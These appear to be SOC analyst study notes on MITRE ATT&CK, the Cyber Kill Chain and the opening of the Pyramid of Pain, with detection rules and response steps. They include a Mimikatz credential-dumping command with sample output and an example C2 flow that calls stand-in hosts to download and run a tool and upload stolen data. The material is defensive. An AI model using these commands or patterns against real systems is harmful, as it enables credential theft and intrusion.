#  1: MITRE ATT&CK Framework (Tactic vs Technique)

- MITRE ATT&CK is THE industry standard framework for understanding adversary behavior.

- MITRE Corporation created the ATT&CK framework.


#### **ATT&CK** = Adversarial Tactics, Techniques, and Common Knowledge

It's a giant encyclopedia of how hackers attack systems, based on real-world observations.

It is a knowledge base of:
- How attackers behave
- Real-world attack techniques
- Mapped attack patterns

#### Why SOC Analysts Use MITRE?

- To classify attacks
- To understand attacker behavior
- To map alerts to known techniques
- To improve detection coverage


## ATT&CK Structure: Tactics → Techniques → Sub-Techniques

###  TACTICS - The "WHY"
**Tactics** = The adversary's objective at each stage of the attack.

##### The 14 Tactics (in attack order):

| # | Tactic | Simple Explanation | Attacker's Goal |
| :--- | :--- | :--- | :--- |
| 1 | **Reconnaissance** | Gathering information | "Let me research my target" |
| 2 | **Resource Development** | Preparing attack infrastructure | "Let me buy a domain, setup server" |
| 3 | **Initial Access** | Getting into the network | "How do I get in?" |
| 4 | **Execution** | Running malicious code | "Let me run my malware" |
| 5 | **Persistence** | Maintaining access | "How do I stay in even after reboot?" |
| 6 | **Privilege Escalation** | Getting higher permissions | "I need admin rights" |
| 7 | **Defense Evasion** | Avoiding detection | "How do I hide from security tools?" |
| 8 | **Credential Access** | Stealing passwords/tokens | "I need more credentials" |
| 9 | **Discovery** | Learning about the environment | "What systems exist? Who are the admins?" |
| 10 | **Lateral Movement** | Moving to other systems | "Let me access other computers" |
| 11 | **Collection** | Gathering data to steal | "Where's the valuable data?" |
| 12 | **Command and Control (C2)** | Communicating with attacker's server | "Let me phone home for instructions" |
| 13 | **Exfiltration** | Stealing data out | "Time to upload the data" |
| 14 | **Impact** | Causing damage | "Let me encrypt/delete everything" |


**Example:**
```
Attacker's Journey:

1. RECONNAISSANCE → Research company employees on LinkedIn
2. INITIAL ACCESS → Send phishing email to employee
3. EXECUTION → Employee clicks link, malware runs
4. PERSISTENCE → Malware creates scheduled task
5. PRIVILEGE ESCALATION → Exploit vulnerability to get admin rights
6. CREDENTIAL ACCESS → Dump passwords from memory
7. LATERAL MOVEMENT → Use stolen credentials to access server
8. COLLECTION → Find database with customer data
9. C2 → Download additional tools from attacker server
10. EXFILTRATION → Upload database to attacker's cloud
11. IMPACT → Deploy ransomware to cover tracks
```

Each step = A different TACTIC

### TECHNIQUES - The "WHAT"
Techniques = Specific methods used to achieve a tactic.

One tactic can have MANY techniques.

#### Example: Initial Access Tactic
**Tactic Goal:** Get into the network

**Different Techniques to achieve this:**

| Technique ID | Technique Name                         | How it Works                     |
|-------------|----------------------------------------|----------------------------------|
| T1566      | Phishing                                | Send malicious email             |
| T1190      | Exploit Public-Facing Application       | Hack vulnerable web server       |
| T1133      | External Remote Services                | Brute force VPN login            |
| T1078      | Valid Accounts                          | Use stolen credentials           |
| T1091      | Replication Through Removable Media     | USB drive with malware           |

Same goal (Initial Access), but 5+ different methods!

## SUB-TECHNIQUES - The "HOW" (Variations)
Sub-Techniques = Specific variations of a technique.

#### Example: Phishing (T1566)
**Main Technique:** Phishing

Sub-Techniques (different types of phishing):

| Sub-Technique ID | Name                         | Description                                      |
|------------------|------------------------------|--------------------------------------------------|
| T1566.001        | Spearphishing Attachment     | Email with malicious file (e.g., invoice.exe)    |
| T1566.002        | Spearphishing Link           | Email with malicious link                        |
| T1566.003        | Spearphishing via Service    | Phishing via LinkedIn, Teams, etc.               |
| T1566.004        | Spearphishing Voice          | Vishing (voice phishing)                         |



### Tactic vs Technique vs Sub-Technique (Visual)
```
TACTIC: Initial Access
   ↓
   TECHNIQUE: T1566 - Phishing
      ↓
      SUB-TECHNIQUE: T1566.001 - Spearphishing Attachment
         ↓
         PROCEDURE: Attacker sends "Invoice.pdf.exe" to victim
```




## How SOC Analysts Use ATT&CK


### 1. Alert Mapping
When you see an alert, map it to ATT&CK:
```
Alert: "Suspicious PowerShell execution detected"

Map to ATT&CK:
- TACTIC: Execution
- TECHNIQUE: T1059 - Command and Scripting Interpreter
- SUB-TECHNIQUE: T1059.001 - PowerShell
```

### 2. Threat Hunting
Search for specific TTPs in your environment:
```
"Let me hunt for Credential Dumping (T1003) 
in our environment to see if attackers are 
stealing passwords"
```


### 3. Incident Investigation
Map the full attack chain:
```
Incident: Ransomware Attack

ATT&CK Mapping:
1. Initial Access: T1566.001 (Phishing email)
2. Execution: T1204.002 (User opened attachment)
3. Persistence: T1053.005 (Scheduled task created)
4. Credential Access: T1003.001 (LSASS memory dump)
5. Lateral Movement: T1021.001 (RDP to other systems)
6. Impact: T1486 (Data encrypted for ransom)
```

### 4. Detection Engineering
Create detection rules based on techniques:
```
"We need detection for T1003 (Credential Dumping)
Let's create a SIEM rule that alerts when:
- lsass.exe is accessed by unusual processes
- Mimikatz command line patterns detected
- Windows Event ID 4656 (LSASS access)
```

# 2: Mapping 4 Common Attacks to MITRE ATT&CK

## The 4 Must-Know Techniques

1. T1110 - Brute Force
2. T1566 - Phishing  
3. T1059.001 - PowerShell
4. T1003 - Credential Dumping

### 1) BRUTE FORCE → T1110
Attackers try many passwords until they find the correct one

- Technique ID: T1110
- Technique Name: Brute Force
- Tactic: Credential Access (TA0006)

#### examples
 - 1: SSH Brute Force
 - 2: Password Spraying

#### How to Detect T1110:
- **Detection Methods:**
- Multiple failed login attempts
- Account lockouts
- Unusual login patterns
- SIEM Rules:
```
IF failed_logins > 20 within 10 minutes
FROM same source_ip
THEN ALERT "Possible Brute Force (T1110)"
```



#### SOC Response to T1110:
**When you see brute force alert:**

1. ✅ Identify the target (Which account/system?)
2. ✅ Check if successful (Any successful logins mixed in?)
3. ✅ Block source IP (at firewall)
4. ✅ Lock account (if compromised)
5. ✅ Force password reset (if needed)
6. ✅ Enable MFA (prevent future attempts)


### 2) PHISHING → T1566
- Attackers send deceptive messages to trick users into clicking links, opening files, or revealing credentials.
- Tricking people via email/messages

- Technique ID: T1566
- Technique Name: Phishing
- Tactic: Initial Access (TA0001)


#### How to Detect T1566:
 **SIEM Detection:**
```
 RULE: Email with attachment + external sender + 
      suspicious keywords ("invoice", "urgent", "password")
→ ALERT for review
```


### SOC Response to T1566:
**When phishing email detected:**

- ✅ Quarantine the email (remove from all inboxes)
- ✅ Check who clicked (review proxy/email logs)
- ✅ If clicked - investigate:
	- Did user download file?
	- Did user enter credentials?
	- Scan user's system for malware
- ✅ Block sender domain (email gateway)
- ✅ Block malicious URLs (web proxy)
- ✅ Security awareness (educate users)
- ✅ Submit to threat intel (PhishTank, etc.)



### 3) POWERSHELL → T1059.001
Attackers use PowerShell (Windows built-in tool) to execute malicious commands.

- Technique ID: T1059.001
- Parent Technique: T1059 - Command and Scripting Interpreter
- Sub-Technique: PowerShell
- Tactic: Execution (TA0002)

Why Powershell
- Pre-installed on Windows (no need to upload tools)
- Powerful capabilities (access to .NET, WMI, registry)
- Often whitelisted (security tools trust it)
- Can run in memory (fileless attacks)
- Easy to obfuscate (encode/encrypt commands)



#### How to Detect T1059.001:
**Detection Methods:**
1. PowerShell Logging (Enable These!):
```
Windows Event IDs:
- 4103: Module logging
- 4104: Script block logging (captures full commands!)
- 4105: Script block logging start
- 4106: Script block logging stop
```

2. SIEM Rules:
```
2. RULE: PowerShell executed with:
  - Encoded commands (-enc)
  - AND Network activity (DownloadString)
  - AND Hidden window (-w hidden)
  
→ ALERT: Suspicious PowerShell (T1059.001)
```

#### SOC Response to T1059.001:
When suspicious PowerShell detected:

- ✅ Capture the command (from Event ID 4104)
- ✅ Decode if obfuscated (use CyberChef, PowerShell decoder)
- ✅ Analyze what it does:
	- Downloads file? → Get URL, analyze
	- Connects to IP? → Check IP reputation
	- Accesses LSASS? → Credential theft!
- ✅ Check parent process (what launched PowerShell?)
	- Word.exe → Macro attack
	- cmd.exe → Possible script
- ✅ Isolate system (if malicious)
- ✅ Hunt for similar activity (other systems affected?)



###  CREDENTIAL DUMPING → T1003
Attackers steal passwords/hashes from operating system memory, files, or databases.

- Technique ID: T1003
- Technique Name: OS Credential Dumping
- Tactic: Credential Access (TA0006)

**example:**
**Mimikatz LSASS Dump (T1003.001)**
```
ATTACK FLOW:
1. Attacker gains admin rights on workstation
2. Runs Mimikatz (credential dumping tool)
3. Command: sekurlsa::logonpasswords

Output:
Authentication Id : 0 ; 123456
Session           : Interactive from 1
User Name         : john.doe
Domain            : COMPANY
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : john.doe
         * Domain   : COMPANY
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : a3d5c...

4. Attacker now has:
   - Plaintext password (if available)
   - NTLM hash (can be used for Pass-the-Hash)

5. Uses stolen credentials to access other systems

ATT&CK Mapping:
- TACTIC: Credential Access
- TECHNIQUE: T1003 - OS Credential Dumping
- SUB-TECHNIQUE: T1003.001 - LSASS Memory
```

#### How to Detect T1003:

1. Process Monitoring:
```
⚠️ Suspicious processes accessing LSASS:
   - mimikatz.exe
   - procdump.exe (targeting lsass)
   - taskmgr.exe creating lsass dump
   - Non-system processes reading lsass.exe memory

Windows Event ID: 4656 (Object access)
- Object Name: lsass.exe
- Process Name: [suspicious tool]
```

2. SIEM Rules:
```
RULE 1: LSASS Memory Access
IF process_name != (wininit.exe, csrss.exe, svchost.exe)
AND target_process == "lsass.exe"
AND access_rights == PROCESS_VM_READ
THEN ALERT "Credential Dumping Attempt (T1003.001)"

RULE 2: Known Tool Detection
IF process_name in (mimikatz.exe, procdump.exe, pwdump.exe)
THEN ALERT "Credential Dumping Tool (T1003)"
```


#### SOC Response to T1003:

**When credential dumping detected:**
- ✅ ISOLATE affected system immediately
- ✅ Assume credentials compromised:
	- Force password reset for all users who logged into that system
	- Revoke all active sessions
	- Reset service account passwords
- ✅ Check for lateral movement:
	- Did attacker use stolen creds elsewhere?
	- Search for logins from affected accounts
- ✅ Hunt for persistence:
	- New user accounts created?
	- Scheduled tasks?
	- Backdoors?
- ✅ Forensic preservation:
	- Capture memory image
	- Preserve logs
	- Document timeline
- ✅ Escalate to Incident Response team


### Summary of 4 Key Techniques

| Technique | ID | Tactic | What Happens | Detection | Response |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Brute Force** | T1110 | Credential Access | Trying many passwords | Multiple failed logins | Block IP, lock account |

# 3: ==Cyber Kill Chain Stages==
The Cyber Kill Chain is one of the oldest and most famous cybersecurity frameworks.


**Created by:** Lockheed Martin (2011)
**Purpose:** Model the stages of a cyber attack from reconnaissance to final objective

**Think of it as:** A step-by-step roadmap that attackers follow


**key concept:**
If you can break the chain at ANY stage, you stop the attack!

####  7 Stages of the Cyber Kill Chain
```
1. RECONNAISSANCE      🔍 (Research the target)
         ↓
2. WEAPONIZATION       🔨 (Create the attack tool)
         ↓
3. DELIVERY            📦 (Send the weapon to target)
         ↓
4. EXPLOITATION        💥 (Weapon executes, exploits vulnerability)
         ↓
5. INSTALLATION        🔧 (Malware installs on system)
         ↓
6. COMMAND & CONTROL   📡 (Establish communication channel)
         ↓
7. ACTIONS ON OBJECTIVE 🎯 (Achieve the goal: steal data, encrypt files, etc.)
```


#### Example:
**SCENARIO: Ransomware Attack on FinanceCorp**

```
1. RECONNAISSANCE (Week 1)
   ✅ Attacker researches FinanceCorp on LinkedIn
   ✅ Finds employee emails, identifies technologies
   ✅ Discovers vulnerable VPN server

2. WEAPONIZATION (Week 1)
   ✅ Creates malicious Excel file: "Invoice_Q1.xlsx"
   ✅ Embeds Cobalt Strike beacon in macro
   ✅ Tests against antivirus (bypasses 60/70 vendors)

3. DELIVERY (Week 2, Monday)
   ✅ Sends phishing email to 50 employees
   ✅ Subject: "Urgent: Payment Overdue"
   ✅ 3 employees open the attachment

4. EXPLOITATION (Week 2, Monday 10:15 AM)
   ✅ Employee clicks "Enable Content"
   ✅ Macro executes PowerShell
   ✅ Downloads Cobalt Strike from attacker server

5. INSTALLATION (Week 2, Monday 10:16 AM)
   ✅ Beacon installs to: C:\ProgramData\svchost.exe
   ✅ Creates scheduled task for persistence
   ✅ Hides as Windows process

6. COMMAND & CONTROL (Week 2-4)
   ✅ Beacon calls home every 60 seconds
   ✅ Attacker sends commands:
      - Reconnaissance (network mapping)
      - Credential dumping (Mimikatz)
      - Lateral movement (to 50 more systems)
      - Privilege escalation (domain admin)

7. ACTIONS ON OBJECTIVE (Week 4, Friday 2 AM)
   ✅ Delete backups
   ✅ Deploy ransomware to all systems
   ✅ 500 computers encrypted
   ✅ Ransom demand: $5 million in Bitcoin

RESULT: Business operations halted for 2 weeks
        $5M ransom paid + $10M in recovery costs
```

#### Breaking the Chain (Defense at Each Stage)

| Stage | How to Break It | Impact if Broken |
| :--- | :--- | :--- |
| **1. Reconnaissance** | Hide public info, detect scanning | Attack planning disrupted |
| **2. Weaponization** | *(Can't defend directly)* | N/A |
| **3. Delivery** | Email filtering, user training | 🔥 **BEST PLACE TO STOP** |
| **4. Exploitation** | Patching, disable macros | Attack neutralized |
| **5. Installation** | EDR, app whitelisting | Malware can't persist |
| **6. C2** | Network monitoring, firewall | Attacker can't control system |
| **7. Actions** | DLP, backups, monitoring | Damage minimized |


## 1: RECONNAISSANCE (Recon)
Attacker gathers information about the target organization.

**Attacker look for:**

| Information Type             | Where They Find It         | Example                                   |
| :--------------------------- | :------------------------- | :---------------------------------------- |
| **Employee names & emails**  | LinkedIn, company website  | john.doe@company.com                      |
| **Organizational structure** | LinkedIn, press releases   | "John Doe - IT Manager"                   |
| **Technologies used**        | Job postings, tech blogs   | "Must know Cisco ASA firewalls"           |
| **Company news**             | Social media, news sites   | "Company launching new product next week" |
| **Network infrastructure**   | DNS queries, WHOIS, Shodan | Mail server: mail.company.com             |
| **Open ports/services**      | Port scanning (Nmap)       | Port 22 (SSH) open on 1.2.3.4             |
| **Vulnerabilities**          | Vulnerability scanners     | CVE-2021-44228 (Log4Shell) found          |
### Types of Reconnaissance:
#### A) Passive Recon (No direct contact)
```
✅ Searching Google, LinkedIn, Facebook
✅ WHOIS lookups
✅ DNS enumeration
✅ Reading company website, job postings
✅ Checking Shodan (search engine for IoT devices)
✅ Reviewing GitHub repositories

👉 Target doesn't know they're being researched
```
#### B) Active Recon (Direct interaction)
```
⚠️ Port scanning (Nmap)
⚠️ Vulnerability scanning
⚠️ Social engineering (calling help desk)
⚠️ Phishing emails to test defenses

👉 May trigger alerts (leaves footprints)
```

#### How to Defend Against Recon:
 1. Limit public information exposure
 2. Monitor for scanning activity
	- IDS/IPS alerts on port scans
	- Honeypots to detect probing
3. Employee awareness

## 2: WEAPONIZATION
- Attacker creates the attack weapon (malware, exploit kit, malicious document).
- Build a deliverable payload that will exploit the target

| Weapon Type | Description | Example |
| :--- | :--- | :--- |
| **Malicious Document** | Office file with macro/exploit | `Invoice.docx` with VBA macro |
| **Exploit Kit** | Pre-packaged exploit collection | Angler EK, RIG EK |
| **Trojan** | Malware disguised as legitimate file | `FakeUpdate.exe` |
| **Backdoor** | Remote access tool (RAT) | Cobalt Strike, Meterpreter |
| **Watering Hole** | Compromised legitimate website | Inject malware into news site |
###  How to Defend Against Weaponization:
You CAN'T directly defend at this stage!

Why? Because weaponization happens on the attacker's infrastructure, not yours.

**But you can:**
- Threat intelligence sharing (learn about new weapons)
- Proactive vulnerability patching (remove targets)
- Email security (detect malicious attachments at delivery)

## ==3: DELIVERY==
Attacker delivers the weapon to the target.

#### common delivery methods
| Method | Description | Example |
| :--- | :--- | :--- |
| **Email Attachment** | Weaponized file via email | Phishing with malicious `.docx` |
| **Malicious Link** | URL in email/message | "Click here to reset password" |
| **Watering Hole** | Compromised legitimate website | News site infected with exploit kit |
| **USB Drive** | Physical delivery | Drop infected USB in parking lot |
| **Supply Chain** | Compromise software update | SolarWinds attack |
| **Removable Media** | CD/DVD, external drive | Infected installation media |

### How to Defend Against Delivery:
1. **Email Security Gateway**
```
- Spam filters
- Attachment scanning
- URL filtering
- SPF/DKIM/DMARC checks
```

2. **Web Filtering**
```
- Block known malicious sites
- SSL inspection
- Sandboxing suspicious downloads
```


3. **User Training**
```
- Phishing awareness
- "Don't open unknown attachments"
- Report suspicious emails
```


## 4: EXPLOITATION
The delivered weapon exploits a vulnerability and executes.

 Trigger the vulnerability to run malicious code

#### What Gets Exploited:
| Vulnerability Type | Description | Example |
| :--- | :--- | :--- |
| **Software Vulnerability** | Bug in application | Log4Shell (CVE-2021-44228) |
| **User Action** | Tricking user to execute | "Enable macros" button |
| **Zero-Day** | Unknown vulnerability | Exploit before patch exists |
| **Configuration Weakness** | Misconfiguration | Default passwords, open shares |
| **Browser Exploit** | Vulnerability in web browser | Drive-by download |

#### How to Defend Against Exploitation:
1. Patch Management
```
- Regular software updates
- Emergency patching for critical CVEs
- Automated patch deployment
```

2. Vulnerability Scanning
```
- Regular vulnerability assessments
- Prioritize critical CVEs
```


## 5:  INSTALLATION
Malware installs itself on the victim system to maintain access.

#### Installation Methods:
| Method | Description | Example |
| :--- | :--- | :--- |
| **Registry Modification** | Add startup entry | `HKLM...\Run` |
| **Scheduled Task** | Create task to run at boot/login | `schtasks /create` |
| **Service Creation** | Install as Windows service | `sc create malware_svc` |
| **DLL Injection** | Inject into legitimate process | Injecting into `explorer.exe` |
| **Startup Folder** | Drop file in startup folder | `C:\Users...\Startup\` |
| **Browser Extension** | Malicious browser add-on | Fake ad-blocker |
| **Bootkit/Rootkit** | Low-level system infection | MBR/UEFI modification |

####  How to Defend Against Installation:
1. Endpoint Protection
```
- Antivirus/EDR (detect malware installation)
- Behavioral monitoring
- Block unauthorized file writes to system folders
```

2. Application Whitelisting
```
- Only approved applications can run
- Blocks installation of unauthorized software
```

3. Integrity Monitoring
```
- Monitor registry for unauthorized changes
- File integrity monitoring (FIM)
- Alert on new scheduled tasks/services
```


## 6: COMMAND & CONTROL (C2)
- Malware communicates with attacker's server to receive commands and send data.
 - Establish two-way communication channel for attacker to control compromised system


#### C2 Communication Methods:

| Protocol | Description | Example |
| :--- | :--- | :--- |
| **HTTP/HTTPS** | Looks like normal web traffic | Beaconing to `evil.com/update` |
| **DNS** | Commands hidden in DNS queries | Tunneling via TXT records |
| **IRC** | Internet Relay Chat | Old-school chat protocol |
| **Social Media** | Commands via Twitter/Facebook | Bot checks Twitter for commands |
| **Email** | Commands via email | Malware checks Gmail |
| **Cloud Services** | Dropbox, OneDrive, Pastebin | Upload/download via legit service |
| **Custom Protocols** | Proprietary protocol | Encrypted binary protocol |

#### C2 working
```
TYPICAL C2 FLOW:

1. BEACON (Malware → C2 Server)
   Infected PC: "I'm here! Waiting for commands..."
   
   HTTP Request:
   GET http://evil-cdn.com/update.php?id=VICTIM123
   
2. COMMAND (C2 Server → Malware)
   C2 Server: "Download additional tool from..."
   
   HTTP Response:
   200 OK
   Body: {"cmd":"download","url":"http://tools.evil.com/scanner.exe"}

3. EXECUTION (Malware executes command)
   Malware: Downloads and runs scanner.exe

4. EXFILTRATION (Malware → C2 Server)
   Malware: "Here's the data you wanted..."
   
   POST http://evil-cdn.com/upload.php
   Body: [stolen data]

5. REPEAT (Every X minutes/hours)
   Malware checks in regularly for new commands
```



#### How to Defend Against C2:
1. Network Monitoring
```
- Monitor outbound connections
- Unusual beaconing patterns (regular intervals)
- Connections to newly registered domains
- Geographic anomalies (why is accounting PC talking to Russia?)
```

2. DNS Monitoring
```
- Long domain names (data encoding)
- High volume of DNS queries
- Queries to suspicious TLDs (.tk, .ml, etc.)
```

3. Threat Intelligence
```
- IOC feeds (known C2 servers)
- SIEM correlation with threat intel
```


## 7: ACTIONS ON OBJECTIVE
Attacker achieves their final goal (data theft, ransomware, destruction).


#### Common Objectives:




####  How to Defend Against Actions on Objective:
1. ==Data Loss Prevention (DLP)==
```
- Monitor large data transfers
- Block uploads to unauthorized cloud services
- Encrypt sensitive data at rest
```

2. Backup Strategy
```
- Offline/immutable backups
- Regular backup testing
- Geographic separation
```

3. Privilege Management
```
- Least privilege principle
- Separate admin accounts
- Just-in-time access
```






## Cyber Kill Chain vs MITRE ATT&CK

| Aspect | Cyber Kill Chain | MITRE ATT&CK |
| :--- | :--- | :--- |
| **Created** | 2011 (Lockheed Martin) | 2013 (MITRE) |
| **Stages** | 7 linear stages | 14 tactics (not always linear) |
| **Focus** | Perimeter-based attacks | Modern attacks (including insider, cloud) |
| **Granularity** | High-level phases | Detailed techniques (190+) |
| **Use Case** | Understand attack flow | Map specific TTPs |
| **Limitation** | Assumes linear progression | Complex but comprehensive |

==Both are valid! Kill Chain is simpler, ATT&CK is more detailed.==

# 4: Pyramid of Pain (Hash vs TTP)
The Pyramid of Pain explains which defensive actions hurt attackers the most.

## The Pyramid of Pain
**Created by:** David Bianco (2013)
**Purpose:** Show which Indicators of Compromise (IOCs) are most valuable to defenders

"The higher you go on the pyramid, the MORE PAIN it causes attackers when you detect/block them"
```
                    /\

                  /    \
                 / TTPs \  ← 🔥 MOST PAIN (Hardest for attacker)
